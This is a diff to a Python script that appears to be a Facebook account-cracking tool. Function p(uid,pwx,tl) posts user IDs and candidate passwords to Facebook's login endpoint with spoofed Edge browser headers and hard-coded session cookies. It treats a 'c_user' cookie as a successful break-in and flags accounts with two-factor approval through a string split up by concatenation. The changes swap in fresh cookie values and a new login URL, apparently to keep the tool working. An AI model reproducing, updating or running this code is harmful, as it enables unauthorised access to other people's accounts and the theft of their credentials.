@@ -1360,9 +1360,9 @@ def p(uid,pwx,tl):
             'ps_l': '1',
             'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
             'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'locale': 'hi_IN',
+            'locale': 'en_US',
             'wd': '1440x828',
-            'fr': '1Sh4kaqKnrag5qyxN.AWVCTEVvpROf7X-r2ryKpveY6e8.BmjDcj..AAA.0.0.BnRhOu.AWWkkOLZ4Nw',}
+            'fr': '1cVak73LsUGtVn82L.AWVCOfEftM5exzqz23BT0Ygmaag.BnRx5w..AAA.0.0.BnRx8Q.AWUrItA19rQ',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
@@ -1371,10 +1371,10 @@ def p(uid,pwx,tl):
             'dpr': '1',
             'origin': 'https://www.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=AffqiGq9eON2HDWiAJsZvn7gw3yctNnCz1TycNzFkxSouE1uVKskUi4nqDHeZD3noCm8kK6Kc9mzFt0VjME5dX7Y_Mvfj50R32X_qh81thAs9g&smuh=536&lh=Ac_XwY9rU37mZLZHVak',
+            'referer': 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMyNzE0MjQwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.63", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
+            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.70", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
@@ -1387,7 +1387,7 @@ def p(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
             'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMyNjQ1ODA2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
+            url = 'https://www.facebook.com/login/device-based/regular/login/'
             po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
